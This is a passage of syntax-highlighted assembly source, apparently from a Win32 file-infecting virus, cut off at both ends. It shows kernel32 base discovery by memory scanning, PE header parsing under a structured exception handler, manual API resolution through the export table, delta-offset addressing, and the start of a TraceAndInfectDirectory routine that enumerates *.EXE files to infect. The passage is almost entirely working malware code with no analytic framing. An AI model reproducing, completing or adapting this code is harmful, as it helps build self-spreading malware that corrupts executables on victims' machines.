    </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ARG_1</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">]</span><span class="sc0">                                           </span><span class="sc1">; ESI -&gt; ptr into K32</span><span class="sc0">
    </span><span class="sc6">SAR</span><span class="sc0">     </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">                                              </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">SAL</span><span class="sc0">     </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">                                              </span><span class="sc1">; ESI &amp;= 0xFFFF0000</span><span class="sc0">
  </span><span class="sc5">@@test_4_PE_hdr</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ESI</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GetNTHeaders</span><span class="sc0">
    </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
    </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc10">@F</span><span class="sc0">
    </span><span class="sc1">; K32 PE hdr found !</span><span class="sc0">
    </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc0">        
    </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">@@exit_proc</span><span class="sc0">
  </span><span class="sc5">@@</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000010000h</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">@@test_4_PE_hdr</span><span class="sc0">
  </span><span class="sc5">@@exit_proc</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">RET</span><span class="sc0">     </span><span class="sc2">4</span><span class="sc0">
    
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Args:</span><span class="sc0">
</span><span class="sc1">; [ESP + 4]   - ptr to an PE image</span><span class="sc0">
</span><span class="sc1">; EBP         - delta !</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Returns:</span><span class="sc0">
</span><span class="sc1">; the ptr to the NT headers of NULL in case of an error</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Reserved Regs: ALL</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">GetNTHeaders</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">ARG_1</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESP</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">SIZEOF</span><span class="sc0"> </span><span class="sc5">PUSHA_STRUCT</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;   INT    3</span><span class="sc0">
    </span><span class="sc6">PUSHAD</span><span class="sc0">
    </span><span class="sc1">; set up SEH frame</span><span class="sc0">
    </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
    </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">SehHandler</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EBX</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">FS</span><span class="sc4">:[</span><span class="sc8">EAX</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">FS</span><span class="sc4">:[</span><span class="sc8">EAX</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ESP</span><span class="sc0">
    </span><span class="sc1">; process</span><span class="sc0">
    </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">                                             </span><span class="sc1">; EAX -&gt; 0 (result REG)</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ARG_1</span><span class="sc0">                                           </span><span class="sc1">; ESI -&gt; pImage</span><span class="sc0">
    </span><span class="sc6">MOVZX</span><span class="sc0">   </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1234</span><span class="sc0">
    </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"ZM"</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1234</span><span class="sc0">
    </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">GetNTHeaders_exit</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">]</span><span class="sc5">.IMAGE_DOS_HEADER.e_lfanew</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4321</span><span class="sc0">
    </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"EP"</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4321</span><span class="sc0">
    </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">GetNTHeaders_exit</span><span class="sc0">
    </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">]</span><span class="sc0">    
  </span><span class="sc5">GetNTHeaders_exit</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">FS</span><span class="sc4">:[</span><span class="sc8">EBX</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">ESP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> 
    </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ESP</span><span class="sc4">]</span><span class="sc5">.PUSHA_STRUCT._EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">                              </span><span class="sc1">; EAX -&gt; popad'd REGs</span><span class="sc0">
    </span><span class="sc6">POPAD</span><span class="sc0">
    </span><span class="sc6">RET</span><span class="sc0">     </span><span class="sc2">4</span><span class="sc0">
    
</span><span class="sc5">SehHandler</span><span class="sc0"> </span><span class="sc9">PROC</span><span class="sc0"> </span><span class="sc10">C</span><span class="sc0"> </span><span class="sc5">pExcept</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc4">,</span><span class="sc5">pFrame</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc4">,</span><span class="sc5">pContext</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc4">,</span><span class="sc5">pDispatch</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc0">
</span><span class="sc1">;   INT     3</span><span class="sc0">
    </span><span class="sc1">;-&gt; modify EIP and continue execution</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">pContext</span><span class="sc0">                                        </span><span class="sc1">; EAX -&gt; context ptr</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EAX</span><span class="sc4">]</span><span class="sc5">.CONTEXT.regEbp</span><span class="sc0">                            </span><span class="sc1">; ECX -&gt; debuggee's EBP</span><span class="sc0">
    </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ECX</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">GetNTHeaders_exit</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">EAX</span><span class="sc4">]</span><span class="sc5">.CONTEXT.regEip</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ExceptionContinueExecution</span><span class="sc0">
    </span><span class="sc6">RET</span><span class="sc0">
</span><span class="sc5">SehHandler</span><span class="sc0"> </span><span class="sc9">ENDP</span><span class="sc0">     
    
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; void* GetProcAddr(HINSTANCE hDLL, char* szAPI, DWORD dwcAPIStrSize);</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Returns:</span><span class="sc0">
</span><span class="sc1">; NULL     - in case of an error</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Reserved Regs: Win32 API</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">GetProcAddr</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">ARG_1</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESP</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0">  </span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">ARG_2</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESP</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">ARG_3</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESP</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EBX</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ESI</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EDI</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESP</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">                                  </span><span class="sc1">; EDX -&gt; dll base</span><span class="sc0">
    
    </span><span class="sc1">; get ptr to NT hdrs</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EDX</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GetNTHeaders</span><span class="sc0">
    </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">                                             </span><span class="sc1">; EAX -&gt; ptr to NT hdrs</span><span class="sc0">
    </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">@@GetProcAddr_exit</span><span class="sc0">
    
    </span><span class="sc1">; get ptr to ExportTable (PE32/PE32+ dependent code)</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EAX</span><span class="sc4">]</span><span class="sc5">.IMAGE_NT_HEADERS.OptionalHeader.Magic</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">IMAGE_NT_OPTIONAL_HDR32_MAGIC</span><span class="sc0">
    </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">get_exp_table_rva_64</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EAX</span><span class="sc4">]</span><span class="sc5">.IMAGE_NT_HEADERS.OptionalHeader.DataDirectory</span><span class="sc4">[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc5">.VirtualAddress</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc10">@F</span><span class="sc0">
  </span><span class="sc5">get_exp_table_rva_64</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EAX</span><span class="sc4">]</span><span class="sc5">.IMAGE_NT_HEADERS64.OptionalHeader.DataDirectory</span><span class="sc4">[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc5">.VirtualAddress</span><span class="sc0">
  </span><span class="sc5">@@</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc0">                                             </span><span class="sc1">; EDI -&gt; exp table RVA</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">]</span><span class="sc5">.IMAGE_EXPORT_DIRECTORY.AddressOfNames</span><span class="sc0">     </span><span class="sc1">; ESI -&gt; exp symbol names chain RVA</span><span class="sc0">
    </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc0">
    </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0">                                             </span><span class="sc1">; EBX = chain index</span><span class="sc0">
    
  </span><span class="sc5">process_name</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc1">; compare API strings</span><span class="sc0">
        </span><span class="sc6">LODSD</span><span class="sc0">
        </span><span class="sc6">PUSHAD</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EAX</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESP</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">SIZEOF</span><span class="sc0"> </span><span class="sc5">PUSHA_STRUCT</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESP</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">SIZEOF</span><span class="sc0"> </span><span class="sc5">PUSHA_STRUCT</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">REPZ</span><span class="sc0">    </span><span class="sc6">CMPSB</span><span class="sc0">
        </span><span class="sc6">POPAD</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">API_name_found_in_chain</span><span class="sc0">     
    </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">EBX</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">]</span><span class="sc5">.IMAGE_EXPORT_DIRECTORY.NumberOfNames</span><span class="sc0">
    </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">process_name</span><span class="sc0">
    </span><span class="sc1">; (all names processed but nothing found)</span><span class="sc0">
    </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
    </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">@@GetProcAddr_exit</span><span class="sc0">
    
  </span><span class="sc5">API_name_found_in_chain</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc1">; grab corresponding ordinal</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">]</span><span class="sc5">.IMAGE_EXPORT_DIRECTORY.AddressOfNameOrdinals</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc0">                                             </span><span class="sc1">; EAX -&gt; ordinal chain ptr</span><span class="sc0">
        </span><span class="sc6">MOVZX</span><span class="sc0">   </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EAX</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">                          </span><span class="sc1">; ECX -&gt; symbol ordinal</span><span class="sc0">
        
        </span><span class="sc1">; finally get symbol RVA</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">]</span><span class="sc5">.IMAGE_EXPORT_DIRECTORY.AddressOfFunctions</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc0">                                             </span><span class="sc1">; EAX -&gt; symbol RVA chain ptr</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EAX</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">  
        </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc0">                                             </span><span class="sc1">; EAX -&gt; symbol ptr</span><span class="sc0">
  </span><span class="sc5">@@GetProcAddr_exit</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">EDI</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">ESI</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">EBX</span><span class="sc0">
    </span><span class="sc6">RET</span><span class="sc0">     </span><span class="sc2">12</span><span class="sc0">
    
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Reserved Regs: NO</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">GrabAPIs</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">API_table</span><span class="sc4">]</span><span class="sc0">                        </span><span class="sc1">; ESI -&gt; first API table entry</span><span class="sc0">
  </span><span class="sc5">NextApiTableEntry</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc1">; receive API addr of current struct</span><span class="sc0">
    </span><span class="sc6">MOVZX</span><span class="sc0">   </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">]</span><span class="sc0">                                  </span><span class="sc1">; EDI -&gt; API str length</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EDI</span><span class="sc0">
    </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">dwK32Base</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GetProcAddr</span><span class="sc0">
    </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">ESI</span><span class="sc0">                                                  </span><span class="sc1">; ESI += 1</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
    </span><span class="sc1">; process next struct</span><span class="sc0">
    </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc0">
    </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">
    </span><span class="sc6">JNZ</span><span class="sc0"> </span><span class="sc5">NextApiTableEntry</span><span class="sc0">
    </span><span class="sc6">RET</span><span class="sc0">
    
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Args:</span><span class="sc0">
</span><span class="sc1">; EBX - delta</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Reserved Regs: NO</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">TraceAndInfectDirectory</span><span class="sc0"> </span><span class="sc9">PROC</span><span class="sc0">
    </span><span class="sc9">LOCAL</span><span class="sc0">   </span><span class="sc5">WFD</span><span class="sc0">                 </span><span class="sc4">:</span><span class="sc0"> </span><span class="sc5">WIN32_FIND_DATA</span><span class="sc0">
    </span><span class="sc9">LOCAL</span><span class="sc0">   </span><span class="sc5">cPath</span><span class="sc4">[</span><span class="sc5">MAX_PATH</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc4">:</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0">
    </span><span class="sc9">LOCAL</span><span class="sc0">   </span><span class="sc5">hFind</span><span class="sc0">               </span><span class="sc4">:</span><span class="sc0"> </span><span class="sc5">HANDLE</span><span class="sc0">
    
    </span><span class="sc1">; get current directory</span><span class="sc0">
    </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">cPath</span><span class="sc0">                                           </span><span class="sc1">; ESI -&gt; path buffer</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ESI</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">MAX_PATH</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">EBX</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_GetCurrentDirectory</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc5">process_current_dir</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">                                                  </span><span class="sc1">; reserve path length</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ESI</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">EBX</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_SetCurrentDirectory</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc13">"*\"
</span><span class="sc0">    </span><span class="sc6">STOSW</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"E."</span><span class="sc0">
    </span><span class="sc6">STOSW</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"EX"</span><span class="sc0">
    </span><span class="sc6">STOSW</span><span class="sc0">
    </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
    </span><span class="sc6">STOSB</span><span class="sc0">
    </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">WFD</span><span class="sc0">                                             </span><span class="sc1">; EDI -&gt; WIN32_FIND_DATA ptr</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EDI</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ESI</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">EBX</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_FindFirstFile</span><span class="sc4">]</span><span class="sc0">
